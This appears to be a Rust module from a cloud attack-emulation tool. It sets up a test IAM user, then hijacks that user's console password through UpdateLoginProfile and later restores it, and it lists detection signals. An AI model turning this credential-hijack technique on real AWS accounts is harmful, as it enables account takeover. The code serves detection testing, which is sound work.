use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
resource "aws_iam_user" "victim" {
  name          = "stratus-red-team-${random_string.suffix.result}"
  force_destroy = true
  tags = { StratusRedTeam = "true" }
}

resource "aws_iam_user_login_profile" "victim" {
  user                    = aws_iam_user.victim.name
  password_reset_required = false
}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

output "user_name" {
  value = aws_iam_user.victim.name
}
"#;

const COMPROMISED_PASSWORD: &str = "Str@tus!RedT3am#New";
const ORIGINAL_PASSWORD: &str = "Str@tus!RedT3am#";

async fn detonate_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let user_name = outputs.get("user_name").ok_or_else(|| anyhow::anyhow!("Missing output: user_name"))?;

    aws.iam
        .update_login_profile()
        .user_name(user_name)
        .password(COMPROMISED_PASSWORD)
        .password_reset_required(false)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!(
        "Updated console login password for user: {} (privilege escalation via credential hijack)",
        user_name
    );

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let user_name = outputs.get("user_name").ok_or_else(|| anyhow::anyhow!("Missing output: user_name"))?;

    aws.iam
        .update_login_profile()
        .user_name(user_name)
        .password(ORIGINAL_PASSWORD)
        .password_reset_required(false)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!("Restored original login password for user: {}", user_name);

    Ok(())
}

fn revert(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.privilege-escalation.iam-update-user-login-profile",
        friendly_name: "Update IAM User Login Profile",
        description: "Updates the console login password of an existing IAM user to gain access to their account and escalate privileges.",
        detection: "CloudTrail: UpdateLoginProfile. GuardDuty: Policy:IAMUser/AnomalousBehavior.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::PrivilegeEscalation],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
